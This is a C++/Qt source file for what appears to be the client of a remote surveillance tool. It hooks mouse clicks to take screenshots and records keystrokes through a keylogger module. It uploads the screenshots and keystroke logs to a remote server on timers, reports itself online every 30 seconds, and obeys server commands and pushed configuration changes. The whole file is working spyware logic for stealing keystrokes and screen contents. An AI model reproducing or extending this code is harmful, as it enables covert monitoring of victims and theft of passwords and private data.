#include <QDebug>
#include "client.h"

Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QString _ip, quint16 _destPort):
    QObject(parent),
    path(defaultPath),
    locPort(_locPort),
    ip(_ip),
    destPort(_destPort)
{
    //Start modules
    fileServer = new FileServer(this, locPort, path);
    fileClient = new FileClient(this, ip, destPort);
    config = new Config;
    onlineTimer = new QTimer(this);
    fileServer->start();

    //Load config
    //Default path ./config.cfg
    if( ! loadConfig(*config, path + "/config.cfg") )
    {
        qDebug() << "Config not found. Creating new.";
        saveConfig(*config, path + "/config.cfg");
    }

    //Update client state
    update();

    //Trying to connect to server
    getOnline();

    //Connect to receive files and strings
    connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
    connect(fileServer, &FileServer::stringReceived, [this](QString str, QString ip){ this->getString(str, ip); });

    //Progress bar
    //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });

    //Make "screens" folder
    QDir dir;
    dir.mkdir(path + "/screens");

    //Connect screenshot module
    connect(&MouseHook::instance(), &MouseHook::mouseClicked, [this]()
    {
        //Thread for making screenshots
        QThread* thread = new QThread(this);
        MakeScreen* screen = new MakeScreen(0, path + "/screens/", MouseHook::instance().getPrevName());
        screen->moveToThread(thread);

        connect(thread, &QThread::started, screen, &MakeScreen::makeScreenshot);
        connect(screen, &MakeScreen::screenSaved, thread, &QThread::quit);
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        connect(thread, &QThread::finished, screen, &MakeScreen::deleteLater);

        thread->start();

        connect(screen, &MakeScreen::screenSaved,
        this, [this](QString screenName)
        {
            MouseHook::instance().setPrevName(screenName);
            //Send screenshot
            fileClient->enqueueData(_FILE, path + "/screens/" + screenName);
            fileClient->connect();
        });
    });

    //Set default folder
    Klog::instance().setPath(path);

    //Send keyboard log by timer timeout
    connect(&Klog::instance(), &Klog::timerIsUp, [this](){
        enqueueLog();
        if ( ! fileClient->isDataQueueEmpty() )
            fileClient->connect();
    });
}

Client::~Client()
{
    fileClient->getOffline();
    delete onlineTimer;
    delete config;
    delete fileClient;
    delete fileServer;
    qDebug() << "Client deleted.";
}

void Client::update()
{
    qDebug() << "\nCONFIG:";
    qDebug() << "Screen timer:\t" << config->secondsScreen;

    // 0 x LMB_RMB_MMB_MWH
    int buttons = config->mouseButtons;

    qDebug() << "LMB:\t" << ((buttons & 0x0008) ? 1 : 0);
    qDebug() << "RMB:\t" << ((buttons & 0x0004) ? 1 : 0);
    qDebug() << "MMB:\t" << ((buttons & 0x0002) ? 1 : 0);
    qDebug() << "MWH:\t" << ((buttons & 0x0001) ? 1 : 0);
    qDebug() << "Logging is " << (config->logRun ? "on" : "off");
    qDebug() << "Log timer:\t" << config->secondsLog << endl;

    //Update screenshot and log parameters
    MouseHook::instance().setParameters(buttons, config->secondsScreen);
    Klog::instance().setParameters(config->logRun, config->secondsLog);
}

void Client::getOnline()
{
    //Start and connect timer
    onlineTimer->start(30*1000);    //30 sec
    connect(onlineTimer, &QTimer::timeout, fileClient, &FileClient::connect);
    connect(fileClient, &FileClient::transmitted, onlineTimer, &QTimer::stop);
    //Send string
    fileClient->enqueueData(_STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
    fileClient->connect();
}

void Client::getFile(const QString& path, const QString& /* ip */)
{
    qDebug() << path;
    QString extension = path.section('.', -1, -1);
    //If config received
    if (extension == "cfg")
        getNewConfig(path);
}

void Client::getString(const QString &string, const QString& /* ip */)
{
    QString command = string.section('|', 0, 0);
    if (command == "FILES")
    {
        QString filesStr = string;
        //remove "FILES|"
        int colonPos = string.indexOf("|");
        filesStr.remove(0, colonPos+1);

        QString currentFile = filesStr.section('|', 0, 0);
        int files = currentFile.toInt();

        switch (files)
        {
        case int(Files::Screen):
            emit MouseHook::instance().mouseClicked();
            break;
        case int (Files::Log):
            enqueueLog();
            break;
        default:
            break;
        }

/*
        //Look for all files in string
        currentFile = filesStr.section('|', 1, 1, QString::SectionSkipEmpty);
        for (int i = 2; ! currentFile.isEmpty(); ++i)
        {
            fileClient->enqueueData(_FILE, currentFile);
            currentFile = filesStr.section('|', i, i, QString::SectionSkipEmpty);
        }
*/
        if (! fileClient->isDataQueueEmpty())
            fileClient->connect();
    }
}

void Client::getNewConfig(const QString &path)
{
    loadConfig(*config, path);
    update();

    //Delete old config and rename new
    QFile oldConfig(this->path + "/config.cfg");
    QFile newConfig(path);
    if (oldConfig.exists())
        oldConfig.remove();
    newConfig.rename(this->path + "/config.cfg");

    //Check if folder is empty and delete
    QDir dir = path.section('/', 0, -2);
    if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
        dir.rmdir(path.section('/', 0, -2)); //dir.name()
}

/*
 * Copy current log to full log
 * Enqueue current log to data queue
 * Delete current log when data will be transmitted
*/
void Client::enqueueLog()
{
    QFile log(path + "/data.log");
    log.rename(path + "/data_tmp.log");
    QFile fullLog(path + "/fullData.log");

    if ( ! (log.open(QIODevice::ReadOnly) &&
         fullLog.open(QIODevice::Append)) )
    {
       qDebug() << "Can't open log files.";
       return;
    }

    //Copy temp log to full log
    fullLog.write(log.readAll());
    log.close();
    fullLog.close();

    fileClient->enqueueData(_FILE, path + "/data_tmp.log");

    //Delete temp log when it will be transmitted
    disconnect(fileClient, &FileClient::transmitted, 0 , 0);
    connect(fileClient, &FileClient::transmitted, [this](){
        QFile::remove(path + "/data_tmp.log");
    });
}

